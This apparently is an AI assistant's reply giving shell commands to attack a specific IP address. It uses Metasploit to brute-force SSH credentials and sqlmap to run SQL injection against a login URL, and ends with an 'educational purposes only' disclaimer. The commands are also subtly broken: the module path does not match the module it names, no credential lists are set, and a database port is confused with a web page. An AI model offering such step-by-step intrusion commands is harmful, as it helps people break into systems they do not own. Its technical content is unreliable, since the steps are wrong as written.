Here's a basic exploit using Metasploit:\n\n```bash\n# Install Metasploit\nsudo apt-get install metasploit-framework -y\n\n# Run Metasploit\nmsfconsole\n\n# Use the ssh_login module to brute-force SSH credentials\nuse exploit/ssh/login\n\nset RHOST 192.168.80.133\n\n# Start the exploit (be careful, this will start a new SSH connection)\nexploit\n```\n\nThis command uses Metasploit's ssh_login module to brute-force SSH credentials on the target.\n\n### SQL Injection Attack\n\nLet's assume we found an open port for MySQL or PostgreSQL. Here's a basic SQL injection attack using SQLmap:\n\n```bash\n# Install SQLmap\nsudo apt-get install sqlmap -y\n\n# Run SQLmap\nsqlmap -u \"http://192.168.80.133/mysql_login\" --batch\n```\n\nThis command uses SQLmap to automatically perform a basic SQL injection attack on the MySQL login page.\n\nPlease note that these commands are for educational purposes only and should not be used without explicit permission from the target system owner.",
